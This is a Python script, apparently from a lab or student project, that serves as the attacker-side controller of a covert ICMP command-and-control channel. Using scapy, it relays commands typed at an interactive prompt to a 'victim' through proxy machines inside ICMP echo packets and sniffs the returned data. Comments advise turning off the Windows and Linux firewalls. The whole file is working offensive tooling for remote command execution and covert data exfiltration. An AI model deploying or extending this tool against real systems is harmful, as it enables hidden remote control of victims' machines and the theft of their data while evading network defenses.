from scapy.all import IP, ICMP,Raw, sniff
from scapy.all import *
import argparse
import mymethods
import re
import comunication_methods as com
import datetime
import random
import threading
from functools import partial 

#Try disabling the firewall temporarily on the VM to test:
#   On Windows: 
#   netsh advfirewall set allprofiles state off
#On Linux: 
#   sudo ufw disable (if ufw is used)


#------------------------------------
def callback_wait_data_from_proxy(packet): 
    print(f"callback wait_data_from_proxy received\n\t{packet.summary()}")
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
        checksum=mymethods.calc_checksum(packet[Raw].load)
        if checksum==packet[ICMP].id and packet[IP].src in testclass.proxy_list:
            if (com.LAST_PACKET).encode() in packet[Raw].load : 
                if packet[Raw].load.decode().replace(com.LAST_PACKET,"").strip()!="":
                    update_list_for_data(packet[IP].src, get_data_from_packet(packet)) 
                print(f"Packet: all possible packet received from {packet[IP].src}")
                com.set_threading_Event(testclass.event_proxy_update.get(packet[IP].src))
                return 
            #print(f"Received Data:\tID:{packet[ICMP].id}\tSeq:{packet[ICMP].seq}\tPayload:{packet[Raw].load}")
            update_list_for_data(packet[IP].src, get_data_from_packet(packet)) 

def callback_attacker_wait_proxy_update(packet): 
    print(f"callback attacker_wait_proxy_update received:\n\t{packet.summary()}")
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        confirm_text=com.CONFIRM_VICTIM+testclass.ip_vittima+packet[IP].src
        checksum=mymethods.calc_checksum((confirm_text).encode()) 
        if packet[ICMP].id==checksum: 
            com.update_thread_response(
                 packet[IP].src
                ,testclass.thread_lock
                ,testclass.thread_proxy_response
                ,response=True
            )
            if not testclass.event_proxy_update.get(packet[IP].src).is_set():
                com.set_threading_Event(testclass.event_proxy_update.get(packet[IP].src))

def callback_wait_conn_from_proxy(packet): 
    print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
        confirm_text=com.CONFIRM_PROXY+testclass.ip_vittima+packet[IP].src
        checksum=mymethods.calc_checksum((confirm_text).encode())
        if checksum==packet[ICMP].id and confirm_text.encode() in packet[Raw].load: 
            print(f"Il pacchetto di {packet[IP].src} ha confermato la connessione") 
            com.set_threading_Event(testclass.event_pktconn) 
            return
        print(f"Il pacchetto di {packet[IP].src} non ha confermato la connessione") 

#------------------------------------
def timeout_sniffer_for_proxy_update(sniffer, event):
    if not event.is_set():
        print("Timeout: No update received within 60 seconds")
        if sniffer.running:
            sniffer.stop()  
        com.set_threading_Event(event)

#-----------------------------------------
def send_start_to_proxies(chosen_proxy:str=None, proxy_list:list=None):
    try:
        com.is_list(proxy_list)
        com.is_valid_ipaddress(chosen_proxy)
    except Exception as e:
        raise Exception(f"send_command_to_chosen_proxy: {e}")
    print(f"Gli altri proxy ascolteranno direttamente la vititma")
    data=(com.START).encode()
    for proxy in proxy_list:
        if proxy!=chosen_proxy and com.send_packet(data,proxy):
            print(f"{proxy} ha ricevuto {data}")
        else:
            print(f"{proxy} non ha ricevuto {data}")

def send_command_to_chosen_proxy(command:str=None, chosen_proxy:str=None, proxy_list:list=None):
        try:
            com.is_list(proxy_list)
            com.is_valid_ipaddress(chosen_proxy) 
            com.is_string(command) 
        except Exception as e:
            raise Exception(f"send_command_to_chosen_proxy: {e}")
        print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
        data=(com.CONFIRM_COMMAND+command).encode()
        if com.send_packet(data,chosen_proxy):
            print(f"Attacker:\t{chosen_proxy} ha ricevuto il comando") 
            return chosen_proxy 
        print(f"Attacker:\t{chosen_proxy} non ha ricevuto il comando") 
        try:
            proxy_list.remove(chosen_proxy)
            print(f"{proxy} rimosso dalla lista {proxy_list}")
        except Exception as e:
            print(f"send_command_to_chosen_proxy: {chosen_proxy} non presente in {proxy_list}. {e}")
        for proxy in proxy_list:
            if com.send_packet(data,proxy): 
                chosen_proxy=proxy
                print(f"Scelto nuovo proxy: {chosen_proxy}")
                return chosen_proxy
        print("Nessun proxy disponibile")
        return None

def update_proxies_end_communication(proxy_list:list=None):
    try:
        com.is_list(proxy_list)
    except Exception as e:
        raise Exception(f"update_proxies_end_communication: {e}")
    for proxy in proxy_list:
        com.send_packet(com.END_COMMUNICATION.encode(),proxy)

def get_data_from_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        return {
             "id":packet[ICMP].id 
            ,"seq":packet[ICMP].seq 
            ,"data":mymethods.sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))
        }
    raise Exception(f"get_data_from_packet: pacchetto non valido {packet.summary()}")

def update_list_for_data(proxy,data):
    testclass.data_lock.acquire()
    testclass.received_data.get(proxy).append(data)
    testclass.data_lock.release()

def initialize_list_for_data(proxy_list):
    list_for_data={}
    for proxy in proxy_list:
        list_for_data.update({proxy:[]})
    return list_for_data
#-----------------------------------------
def ask_command():
    command=input(f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> ")
    return command

def create_timer_for_sniffer(sniffer, event):
    callable= lambda: timeout_sniffer_for_proxy_update(sniffer, event)
    thread_timer=com.get_timeout_timer(60, callable)
    thread_timer.start()
    return thread_timer

def reset_event_update_foreach_proxy(proxy_list:list=None,event_proxy_update:dict=None):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError("reset_event_update_foreach_proxy: proxy_list non è una lista di indirizzi ip valida")
        if not com.is_dictionary(event_proxy_update):
            raise ValueError("reset_event_update_foreach_proxy: Lista degli eventi non corretta")
    except Exception as e:
        raise Exception(f"reset_event_update_foreach_proxy: {e}") 
    for proxy in proxy_list:
        event_proxy_update.get(proxy).clear() 
#-----------------------------------------
def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:dict=None, proxy_list:list=None):
    try:
        com.is_threading_lock(thread_lock) 
        com.is_dictionary(thread_response) 
        if not com.is_list(proxy_list) or len(proxy_list)<=0: 
            raise ValueError("elimina_proxy_nonconnessi: lista proxy non valida")
    except Exception as e:
        raise Exception(f"elimina_proxy_nonconnessi: {e}")
    thread_lock.acquire() 
    proxy_response=thread_response.items()
    thread_lock.release()  
    for proxy,value in proxy_response:
        print(f"Coppia {proxy}/{value}")
        if not value: 
            try: 
                proxy_list.remove(proxy) 
            except Exception as e:
                print(f"check_available_proxies: {proxy} not present in list. {e}")
#-----------------------------------------
def create_event_update_foreach_proxy(proxy_list:list=None):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"create_event_update_foreach_proxy: proxy_list non è una lista di indirizzi valida {proxy_list}")
    except Exception as e:
        raise Exception(f"create_event_update_foreach_proxy: {e}")
    event_proxy_update={}
    for proxy in proxy_list:
        event_proxy_update.update({proxy:com.get_threading_Event()})
    print(f"Eventi creati:\t{event_proxy_update}")
    reset_event_update_foreach_proxy(proxy_list, event_proxy_update)
    return event_proxy_update

def sanifica_lista_proxy(proxy_list:list=None):
    try: 
        com.is_list(proxy_list)
    except Exception as e:
        raise Exception(f"sanifica_lista_proxy: {e}")
    print(f"Proxy unsanitized:{proxy_list}") 
    not_corrected_ip=com.check_proxy_ipaddress(proxy_list)
    if len(not_corrected_ip)>0:
        print(f"Ip non validi: {not_corrected_ip}") 
    for ip in not_corrected_ip:
        proxy_list.remove(ip) 
    print(f"Proxy sanitized:{proxy_list}")

def get_value_of_parser(args):
    if args is None: 
        raise Exception("get_value_of_parser: Nessun argomento passato") 
    return (args.ip_host, args.ip_vittima, mymethods.calc_gateway(args.ip_vittima)) 

def check_value_in_parser(args):
    if type(args) is not argparse.Namespace or args is None:
        print("Nessun argomento passato") 
        return False
    if type(args.ip_vittima) is not str or re.match(com.ip_reg_pattern, args.ip_vittima) is None:
        print("Devi specificare l'IP della vittima con --ip_vittima")
        mymethods.supported_arguments(parser)
        return False
    if type(args.ip_host) is not str or re.match(com.ip_reg_pattern, args.ip_host) is None:
        print("Devi specificare l'IP dell'host con --ip_host")
        mymethods.supported_arguments(parser)
        return False
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
    parser.add_argument("--ip_host",type=str, help="IP dell'host")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    return mymethods.check_args(parser)

#-----------------------------------------
class Attaccante: 
    def __init__(self):
        print("\n\t(＾▽＾)\t__init__\n")
        try: 
            #           __get_value_of_parser__
            args=get_args_from_parser()
            if not check_value_in_parser(args): 
                raise ValueError("__init__: Argomenti nel parser non corretti") 
            self.ip_host, self.ip_vittima, self.gateway_vittima=get_value_of_parser(args) 
            print("ip_vittima\t", self.ip_vittima)
            print("gateway_vittima\t", self.gateway_vittima) 
            #           __check_proxy_ipaddress__
            self.proxy_list = [
                "192.168.56.101" #vm-attaccante
                ,"192.168.56.104" #vm-proxy1
                ,"192.168.56.105" #vn-proxy2
                #,"192.168.56.1"
                ,"192.168.56.xxx"
            ]
            sanifica_lista_proxy(self.proxy_list)
            #           __set_event_proxy_ip__ 
            self.event_proxy_update=create_event_update_foreach_proxy(self.proxy_list) 
        except Exception as e: 
            raise Exception(f"__init__: {e}")  

    def check_available_proxies(self): 
        try:
            if not com.is_list(self.proxy_list) or len(self.proxy_list)<=0: 
                raise ValueError("check_available_proxies: lista proxy non valida")
            com.is_valid_ipaddress(self.ip_vittima) 
        except Exception as e:
            raise Exception(f"check_available_proxies: {e}")
        print(f"Controllo connessione per i proxy\t{self.proxy_list}") 
        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_4_foreach_proxy(self.proxy_list,self.attacker_wait_proxy_update)
        for proxy in self.proxy_list.copy():
            try:
                com.is_valid_ipaddress(proxy) 
            except Exception as e:
                print(f"check_available_proxies: {e}")
                continue
            thread=self.thread_list.get(proxy)
            if not isinstance(thread, threading.Thread):
                raise Exception(f"check_available_proxies: thread non valido {thread}")
            thread.start() 
            print(f"Thread started ID: {thread.ident} \t Proxy:{proxy}")
            if self.confirm_connection_to_proxy(proxy) and self.wait_conn_from_proxy(proxy):
                print(f"Attaccante connesso stabilita con {proxy}") 
                com.update_thread_response(proxy, self.thread_lock, self.thread_proxy_response, True)
            else: 
                print(f"Attaccante connessione fallita con {proxy}") 
        for proxy,thread in self.thread_list.items():
            if thread.is_alive(): 
                print(f"{thread} è ancora vivo")
                com.set_threading_Event(self.event_proxy_update.get(proxy))
                thread.join() 
        elimina_proxy_nonconnessi(self.thread_lock, self.thread_proxy_response, self.proxy_list) 
        print(f"Proxy disponibili dopo eliminazione\t{self.proxy_list}")
    
    def confirm_connection_to_proxy(self,proxy): 
        print("\n\t(＾▽＾)\tconfirm_connection_to_proxy\n")
        try:
            com.is_valid_ipaddress(proxy)
            com.is_valid_ipaddress(self.ip_vittima)
        except Exception as e:
            raise Exception(f"confirm_connection_to_proxy: {e}") 
        data=com.CONFIRM_ATTACKER+self.ip_vittima
        if com.send_packet(data.encode() ,proxy):  
            print(f"got Reply: {proxy} ha risposto...")
            return True 
        print(f"got No-Reply: {proxy} non ha risposto...")
        return False
    
    def wait_conn_from_proxy(self,proxy):
        print("\n\t(＾▽＾)\twait_conn_from_proxy\n")
        confirm_text=com.CONFIRM_PROXY+self.ip_vittima+proxy
        checksum=mymethods.calc_checksum((confirm_text).encode())
        gateway_proxy=mymethods.calc_gateway(proxy)
        args={
            "filter":f"icmp and icmp[0]==8 and src {proxy} and icmp[4:2]={checksum}" 
            #,"count":1 
            ,"prn":callback_wait_conn_from_proxy
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(gateway_proxy)[1]
        }
        try:
            self.event_pktconn=com.get_threading_Event()
            self.sniffer,self.pkt_timer,=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_proxy: {e}") 
        print("verranno fermati lo sniffer e il timer")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.pkt_timer): 
            print(f"{proxy} ha confermato la connessione ")
            return True
        print(f"{proxy} non ha confermato la connessione ")
        return False 
    
    def attacker_wait_proxy_update(self,proxy): 
        print("\n\t(＾▽＾)\tattacker_wait_proxy_update\n")
        confirm_text=com.CONFIRM_VICTIM+self.ip_vittima+proxy
        checksum=mymethods.calc_checksum((confirm_text).encode())
        gateway_proxy=mymethods.calc_gateway(proxy)
        args={
            "filter":f"icmp and icmp[0]==8 and src {proxy} and icmp[4:2]={checksum}"
            #,"count":"1" 
            ,"prn":callback_attacker_wait_proxy_update
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(gateway_proxy)[1] 
        } 
        try:
            event_thread=self.event_proxy_update.get(proxy)
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        if thread_sniffer.running: 
            thread_sniffer.stop() 
            print("sniffer stopped")
        if thread_timer.is_alive():
            thread_timer.cancel() 
            print("timer stopped")
        if com.get_thread_response(proxy,self.thread_lock,self.thread_proxy_response):
            print(f"Attacker\n\tUpdate: {proxy} connected to victim {self.ip_vittima}...")
            return True 
        print(f"Attacker\n\tUpdate: {proxy} not connected to victim {self.ip_vittima}...") 
        return False

    def send_command_to_victim(self):
        self.received_data=initialize_list_for_data(self.proxy_list)
        self.data_lock=threading.Lock()
        self.event_thread_update=create_event_update_foreach_proxy(self.proxy_list)
        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_4_foreach_proxy(self.proxy_list,callback_function=self.wait_data_from_proxy)
        self.event_received_data=com.get_threading_Event()
        print("Attivo i thread per ricevere i dati") 
        for thread in self.thread_list.values():
            thread.start()
        #
        command=ask_command()
        print(f"il comando immesso è {command}")
        while command.lower() not in com.exit_cases:
            try:
                chosen_proxy=random.choice(self.proxy_list)
                print(f"il proxy scelto è {chosen_proxy}")
            except Exception as e:
                raise ValueError(f"send_command_to_victim: {e}") 
            send_start_to_proxies(chosen_proxy, self.proxy_list)
            chosen_proxy=send_command_to_chosen_proxy(command, chosen_proxy, self.proxy_list)
            for thread in self.thread_list.values():
                thread.join()
            print(self.thread_proxy_response)
            print(self.received_data)
            reset_event_update_foreach_proxy(self.proxy_list, self.event_thread_update)
            command=input(f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> ")
        print("Uscita dalla shell\texit") 
        update_proxies_end_communication(self.proxy_list)

    def wait_data_from_proxy(self,proxy):
        gateway_proxy=mymethods.calc_gateway(proxy)
        args={
            "filter":f"icmp and icmp[0]==8 and src {proxy} and dst {self.ip_host}" 
            #,"count":1 
            ,"prn": callback_wait_data_from_proxy 
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(gateway_proxy)[1]
        }  
        try:
            event_thread=self.event_thread_update.get(proxy)
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        print("inzio a fermare lo sniffer e il timer")
        com.stop_sinffer(thread_sniffer)
        if com.stop_timer(thread_timer): 
            print(f"{proxy} ha mandato i dati in tempo")
            com.update_thread_response(
                 proxy
                ,self.thread_lock
                ,self.thread_proxy_response
                ,True
            )
            return True 
        print(f"{proxy} non ha mandato i dati in tempo")
        com.update_thread_response(
             proxy
            ,self.thread_lock
            ,self.thread_proxy_response
            ,False
        )
        return False

    

if __name__=="__main__":
    testclass=Attaccante() 
    #__PARTE 1__
    try:
        testclass.check_available_proxies()
    except Exception as e:
        print(f"main: {e}") 
        exit(0)
    if len(testclass.proxy_list)<1:
        print("Nessun proxy presente. Prova a indicare un'altra macchina") 
        exit(0) 
    print(f"I proxy utilizzabili sono: {testclass.proxy_list}")  
    #__PARTE 2__
    testclass.send_command_to_victim()